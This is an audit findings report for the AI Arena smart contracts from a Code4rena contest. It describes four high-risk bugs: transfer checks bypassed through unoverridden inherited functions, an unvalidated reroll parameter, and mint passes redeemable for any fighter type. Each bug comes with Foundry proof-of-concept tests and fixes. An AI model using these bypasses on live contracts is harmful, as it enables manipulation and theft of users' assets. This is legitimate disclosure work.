# AI Arena - Findings Report

## Table of contents

* ### High Risk Findings

  * #### H-01. GameItems.sol - users are able to transfer items even if transfers are disabled
  * #### H-02. In FighterFarm.sol - users are able to transfer fighters even if the fighter is staked
  * #### H-03. In FighterFarm.sol#reRoll - a user can reroll a normal champion as Dendroid and mess up the attributes
  * #### H-04. In redeemMintPass() - a user can mint whatever type of fighter he wants, regardless of the mint pass type

# <a id='contest-summary'></a>Contest Summary

[See more contest details here](https://code4rena.com/audits/2024-02-ai-arena)

# <a id='results-summary'></a>Results Summary

### Number of findings:

* High: 4
* Medium: 0
* Low: 0

# High Risk Findings

# <a id='H-01'></a>H-01. GameItems.sol - users are able to transfer items even if transfers are disabled

## Impact
Users can transfer game items even if transfers are disabled.
## Proof of Concept
In GameItems.sol there is a function `adjustTransferability` that lets the owner of the contract change the transferability of a game item - i.e make it transferrable or not-transferable.

Also, the `safeTransferFrom` function is overridden so it disables transfers of items that are marked as non-transferable:
```solidity
function safeTransferFrom(
    address from,
    address to,
    uint256 tokenId,
    uint256 amount,
    bytes memory data
)
    public
    override(ERC1155)
{
    require(allGameItemAttributes[tokenId].transferable); <--
    super.safeTransferFrom(from, to, tokenId, amount, data);
}
```
However, the issue stems from the fact that in the inherited ERC1155 contract there is another transfer function that is not rewritten and therefore this require is not checked:
```solidity
require(allGameItemAttributes[tokenId].transferable);
```
Here's the [`safeBatchTransferFrom` from ERC1155.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/ecd2ca2cd7cac116f7a37d0e474bbb3d7d5e1c4d/contracts/token/ERC1155/ERC1155.sol#L134-L146):
```solidity
function safeBatchTransferFrom(
    address from,
    address to,
    uint256[] memory ids,
    uint256[] memory amounts,
    bytes memory data
) public virtual override {
    require(
        from == _msgSender() || isApprovedForAll(from, _msgSender()),
        "ERC1155: caller is not token owner nor approved"
    );
    _safeBatchTransferFrom(from, to, ids, amounts, data);
}
```
This function can be called directly by a user and the item can be transferred doesn't matter its transferability status.

Here is a POC that is a modified version of the already existing `testSafeTransferFrom` test in GameItems.t.sol:
```solidity
function testSafeTransferFromBug() public {
    _fundUserWith4kNeuronByTreasury(_ownerAddress);
    //mint token with id 0 to the _ownerAddress
    _gameItemsContract.mint(0, 1);

    //act as owner
    vm.prank(address(this));
    //set transferability as false
    _gameItemsContract.adjustTransferability(0, false);

   // SafeBatch - create arrays as the function needs arrays
    uint256[] memory ids = new uint256[](1);
    ids[0] = 0;
    uint256[] memory amounts = new uint256[](1);
    amounts[0] = 1;
    //attempt to transfer - this should fail because transferability is set to false. However, it succeeds
    _gameItemsContract.safeBatchTransferFrom(_ownerAddress, _DELEGATED_ADDRESS, ids, amounts, "");

    //assert that the item is transferred
    assertEq(_gameItemsContract.balanceOf(_DELEGATED_ADDRESS, 0), 1);
    assertEq(_gameItemsContract.balanceOf(_ownerAddress, 0), 0);
}
```
## Tools Used
Manual review, Foundry
## Recommended Mitigation Steps
Override the `safeBatchTransferFrom` function as well and add this require:
```solidity
require(allGameItemAttributes[tokenId].transferable);
```

# <a id='H-02'></a>H-02. In FighterFarm.sol - users are able to transfer fighters even if the fighter is staked
## Impact
Users can transfer fighters even if the fighter is staked which is a violation of core functionality. 
## Proof of Concept
As you can see, transfer functions are overridden to disable fighters from being transferred when the `_ableToTransfer` function returns false:
```solidity
function transferFrom(
       address from,
       address to,
       uint256 tokenId
   )
       public
       override(ERC721, IERC721)
   {
       require(_ableToTransfer(tokenId, to));
       _transfer(from, to, tokenId);
   }

   /// @notice Safely transfers an NFT from one address to another.
   /// @dev Add a custom check for an ability to transfer the fighter.
   /// @param from Address of the current owner.
   /// @param to Address of the new owner.
   /// @param tokenId ID of the fighter being transferred.
   function safeTransferFrom(
       address from,
       address to,
       uint256 tokenId
   )
       public
       override(ERC721, IERC721)
   {
       require(_ableToTransfer(tokenId, to));
       _safeTransfer(from, to, tokenId, "");
   }
```
Here is the `_ableToTransfer` function:
```solidity
   function _ableToTransfer(uint256 tokenId, address to) private view returns(bool) {
       return (
         _isApprovedOrOwner(msg.sender, tokenId) &&
         balanceOf(to) < MAX_FIGHTERS_ALLOWED &&
         !fighterStaked[tokenId]
       );
   }
```
Which makes sure that a fighter is not staked, and the recipient has less than `MAX_FIGHTERS_ALLOWED`.

However, this can be circumvented because there is another transfer function that is inherited from the [ERC721 contract and is not overridden](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/ecd2ca2cd7cac116f7a37d0e474bbb3d7d5e1c4d/contracts/token/ERC721/ERC721.sol#L175-L183):
```solidity
   function safeTransferFrom(
       address from,
       address to,
       uint256 tokenId,
       bytes memory data
   ) public virtual override {
       require(_isApprovedOrOwner(_msgSender(), tokenId), "ERC721: caller is not token owner nor approved");
       _safeTransfer(from, to, tokenId, data);
   }
```
Here is a simple POC that you can add to FighterFarm.t.sol:
```solidity
   function testTransferringFighterWhileStakedSucceeds() public {
       _mintFromMergingPool(_ownerAddress);
       _fighterFarmContract.addStaker(_ownerAddress);
       //stake the fighter
       _fighterFarmContract.updateFighterStaking(0, true);

       //assert that owner is _ownerAddress
       assertEq(_fighterFarmContract.ownerOf(0), _ownerAddress);
       //assert that it is staked
       assertEq(_fighterFarmContract.fighterStaked(0), true);

       //transfer the fighter
       _fighterFarmContract.safeTransferFrom(_ownerAddress, _DELEGATED_ADDRESS, 0, "");

       //assert that owner is _DELEGATED_ADDRESS
       assertEq(_fighterFarmContract.ownerOf(0), _DELEGATED_ADDRESS);
   }
```
## Tools Used
Manual review, Foundry
## Recommended Mitigation Steps
Override the 4-argument `safeTransferFrom` function and add this require like in the other functions:
```solidity
require(_ableToTransfer(tokenId, to));
```

# <a id='H-03'></a>H-03. In FighterFarm.sol#reRoll - a user can reroll a normal champion as Dendroid and mess up the attributes
## Impact
A user can reroll a normal champion as Dendroid for `fighterType` as there is no validation of this input parameter in the function.

This shouldn't happen and affects the attributes of the fighter.
## Proof of Concept
Let's take a look at the reroll function:
```solidity
   function reRoll(uint8 tokenId, uint8 fighterType) public {
       require(msg.sender == ownerOf(tokenId));
       require(numRerolls[tokenId] < maxRerollsAllowed[fighterType]);
       require(_neuronInstance.balanceOf(msg.sender) >= rerollCost, "Not enough NRN for reroll");

       _neuronInstance.approveSpender(msg.sender, rerollCost);
       bool success = _neuronInstance.transferFrom(msg.sender, treasuryAddress, rerollCost);
       if (success) {
           numRerolls[tokenId] += 1;
           uint256 dna = uint256(keccak256(abi.encode(msg.sender, tokenId, numRerolls[tokenId])));
           (uint256 element, uint256 weight, uint256 newDna) = _createFighterBase(dna, fighterType);
           fighters[tokenId].element = element;
           fighters[tokenId].weight = weight;
           fighters[tokenId].physicalAttributes = _aiArenaHelperInstance.createPhysicalAttributes(
               newDna,
               generation[fighterType],
               fighters[tokenId].iconsType,
               fighters[tokenId].dendroidBool
           );
           _tokenURIs[tokenId] = "";
       }
   }   
```
As you can see, there is no check that the fighterType a user specifies is the same type he originally owned.

This messes up the newDna that the fighter receives and makes it extremely likely to get a fighter with a very low rarityRank(which means it is very rare):
```solidity
function _createFighterBase(
       uint256 dna,
       uint8 fighterType
   )
       private
       view
       returns (uint256, uint256, uint256)
   {
       uint256 element = dna % numElements[generation[fighterType]];
       uint256 weight = dna % 31 + 65;

       uint256 newDna = fighterType == 0 ? dna : uint256(fighterType); <---

       return (element, weight, newDna);
   }

```
Here, newDna will take the user-inputed value as this is the fighterType i.e newDna = 1.

```solidity
function createPhysicalAttributes(
       uint256 dna,
       uint8 generation,
       uint8 iconsType,
       bool dendroidBool
   )
       external
       view
       returns (FighterOps.FighterPhysicalAttributes memory)
   {
       //unrelated functionality
                   uint256 rarityRank = (dna / attributeToDnaDivisor[attributes[i]]) % 100;
   }
```
In the `createPhysicalAttributes` function, dna will be 1 and as a result `rarityRank` will be very low, possibly 0, which is not expected and it is not the way rarity rank is supposed to be calculated in the system.

Note: the user can't pass anything else other than 0 or 1 as `fighterType` because otherwise `maxRerollsAllowed[fighterType]` will have an array-out-of-bounds error.
## Tools Used
Manual review
## Recommended Mitigation Steps
Add a check that makes sure the user is passing the right fighter type:
```solidity
if(fighters[tokenId].dendroidBool == false)
        require(fighterType == 0);
else
        require(fighterType == 1);
```

# <a id='H-04'></a>H-04. In redeemMintPass() - a user can mint whatever type of fighter he wants, regardless of the mint pass type
## Impact
There are 2 types of mint passes - for [regular Champions](https://opensea.io/assets/arbitrum/0xa4734bf76f511357d4353d88b84204957972ac84/264) and [Dendroid fighters](https://opensea.io/assets/arbitrum/0xa4734bf76f511357d4353d88b84204957972ac84/122), where the Dendroid fighters are rarer and should be more expensive.

However, a user can mint a Dendroid with just a regular mint pass by simply specifying the type of fighter he wants to mint.
## Proof of Concept
Let's take a look at the `redeemMintPass` function in the FighterFarm contract:
```solidity
function redeemMintPass(
    uint256[] calldata mintpassIdsToBurn,
    uint8[] calldata fighterTypes,
    uint8[] calldata iconsTypes,
    string[] calldata mintPassDnas,
    string[] calldata modelHashes,
    string[] calldata modelTypes
)
    external
{
    require(
        mintpassIdsToBurn.length == mintPassDnas.length &&
        mintPassDnas.length == fighterTypes.length &&
        fighterTypes.length == modelHashes.length &&
        modelHashes.length == modelTypes.length
    );
    for (uint16 i = 0; i < mintpassIdsToBurn.length; i++) {
        require(msg.sender == _mintpassInstance.ownerOf(mintpassIdsToBurn[i]));
        _mintpassInstance.burn(mintpassIdsToBurn[i]);
        _createNewFighter(
            msg.sender,
            uint256(keccak256(abi.encode(mintPassDnas[i]))),
            modelHashes[i],
            modelTypes[i],
            fighterTypes[i],
            iconsTypes[i],
            [uint256(100), uint256(100)]
        );
    }
}
```
As you can see, nothing is stopping a user from just claiming Dendroids for all of the mint passes he owns. A malicious user would just buy mint passes for normal fighters and claim only Dendroids.
## Tools Used
Manual review
## Recommended Mitigation Steps
Implement a sufficient validation that the user is claiming the right type of fighters according to his mint passes.
